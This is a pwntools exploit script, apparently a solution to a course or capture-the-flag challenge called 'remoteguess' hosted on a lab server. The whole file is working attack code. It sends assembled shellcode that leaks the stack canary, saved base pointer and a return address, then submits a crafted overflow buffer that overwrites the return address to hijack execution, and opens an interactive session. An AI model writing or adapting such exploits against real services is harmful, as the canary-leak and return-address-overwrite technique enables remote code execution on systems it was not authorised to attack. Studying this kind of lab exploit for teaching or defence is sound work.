#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import pow as pw
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

exe = "./solver_sample" if len(sys.argv) < 2 else sys.argv[1]

payload = asm('push   rbp;mov    rbp,rsp;mov    QWORD PTR [rbp-0x78],rdi;mov    rax,QWORD PTR fs:0x28;mov    QWORD PTR [rbp-0x8],rax;movabs rax,0xa786c6c36313025;mov    QWORD PTR [rbp-0x70],rax;mov    QWORD PTR [rbp-0x68],rax;mov    QWORD PTR [rbp-0x60],rax;mov    QWORD PTR [rbp-0x58],rax;lea    rax,[rbp+0x08];mov    rcx,QWORD PTR [rax];sub    rax,0x08;mov    rdx,QWORD PTR [rax];sub    rax,0x08;mov    rsi,QWORD PTR [rax];lea    rdi,[rbp-0x70];mov    eax,0x0;call   QWORD PTR [rbp-0x78];')
#payload = None
#if os.path.exists(exe):
#    with open(exe, 'rb') as f:
#        payload = f.read()

#r = process("./remoteguess", shell=True)
#r = remote("localhost", 10816)
r = remote("up23.zoolab.org", 10816)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

if payload != None:
    ef = ELF(exe)
    print("** {} bytes to submit, solver found at {}".format(len(payload), str(ef.symbols['solver'])))
    r.sendlineafter(b'send to me? ', str(len(payload)).encode())
    r.sendlineafter(b'to call? ', str(0).encode())
    r.sendafter(b'bytes): ', payload)
    
    r.recvline()
    tmp = str(r.recvline()).split('\'')[1].split('\\')[0]
    print(tmp)
    canary = p64(int(tmp,16))
    tmp = str(r.recvline()).split('\'')[1].split('\\')[0]
    print(tmp)
    rbp = p64(int(tmp,16))
    tmp = str(r.recvline()).split('\'')[1].split('\\')[0]
    print(tmp)
    address = p64(int(tmp,16) + 171)
    guess = "0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    pending = "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
    ans = guess.encode() + canary + rbp + address + pending.encode()
    r.sendafter(b'Show me your answer?', ans)
    
else:
    r.sendlineafter(b'send to me? ', b'0')

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :
